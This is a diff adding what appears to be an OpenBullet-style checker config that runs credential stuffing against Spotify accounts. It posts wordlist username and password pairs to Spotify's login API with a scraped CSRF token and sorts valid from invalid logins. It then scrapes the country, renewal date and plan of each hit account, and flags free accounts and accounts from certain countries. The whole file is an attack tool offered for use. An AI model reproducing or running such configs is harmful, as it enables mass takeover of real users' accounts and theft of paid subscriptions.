@@ -1,0 +1,76 @@
+[SETTINGS]
+{
+  "Name": "Spotfiy Premium for Ghome",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-16T07:54:59.2242302-05:00",
+  "AdditionalInfo": "ffaez1267#6440",
+  "Author": "FFaez1267",
+  "Version": "1.0.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Request REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Parse PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+#Request REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "{\"error\":\"errorInvalidCredentials\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"displayName\":\"" 
+
+#Request REQUEST GET "https://www.spotify.com/us/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Spotify Free" 
+    KEY "Premium Paused" 
+
+#Parse PARSE "<SOURCE>" LR "card-profile-country\">" "</p>" -> CAP "Country" 
+
+#Parse PARSE "<SOURCE>" LR "<b class=\"recurring-date\">" "<" -> CAP "Renew" 
+
+#Parse PARSE "<SOURCE>" LR "<h3 class=\"product-name\">" "</h3>" -> VAR "subscription" 
+
+FUNCTION Replace "<span class=\"icon-checkmark-wrap\"><svg><use xlink:href=\"#icon-checkmark\"></use></svg></span>" "" "<subscription>" -> CAP "Plan" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<SOURCE>" DoesNotContain "card-profile-country\">CA</" 
+    KEY "<SOURCE>" DoesNotContain "card-profile-country\">UK</" 
+    KEY "<SOURCE>" DoesNotContain "card-profile-country\">FR</" 
+    KEY "<SOURCE>" DoesNotContain "card-profile-country\">AU</" 
+    KEY "<SOURCE>" DoesNotContain "card-profile-country\">GB</" 
+
